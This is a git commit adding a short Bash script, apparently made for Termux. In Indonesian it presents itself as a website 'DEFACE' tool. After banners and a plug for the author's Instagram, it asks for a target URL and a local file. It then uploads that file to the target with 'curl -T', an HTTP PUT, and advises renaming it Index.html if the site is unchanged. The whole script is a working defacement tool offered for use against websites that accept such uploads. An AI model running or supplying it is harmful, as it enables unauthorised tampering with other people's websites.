ca89130f6ec9036f203106525b1449155490cbc3
WhoMHw <71681090+WhoMHw@users.noreply.github.com>
2020-10-21 23:12:13 +0700

    Add files via upload

---
+++ aku.sh
@@ -0,0 +1,33 @@
+#!/bin/bash
+
+clear
+figlet tools Gabut :v | lolcat
+
+echo "===================================================================================="
+sleep 3
+echo  "			Author:WhoMHw							 "
+sleep 2
+echo  "		       _tools gabut_							 "
+sleep 1
+echo  "=================================÷============÷========÷======÷=======÷=÷==÷======"
+ sleep 2
+ echo "selamat datang kaka"
+ sleep 1
+ echo "siapa nama kaka?" #tulisan keluar
+ read nick #membaca tulisan
+ clear
+ figlet DEFACE Termux | lolcat
+ echo "kalau mau follow ig ku gpp kalau tidak juga gpp" $nick
+ termux-open https://www.instagram.com/mhw_______wb23/
+ echo "nama target yang akan dideface :"
+ read target
+ echo "nama file kamu: "
+ read file
+ curl -T /storage/emulated/0/$file $target
+ sleep 3
+ clear 
+ figlet Terima Kasih Sudah Pakai Tools Gabut | lolcat
+ echo "===================°°°°°°°°=============÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷============================"
+ echo "jika website tidak berubah coba ganti nama file deface kamu dengan nama Index.html"
+ figlet Salam Gabut | lolcat
+
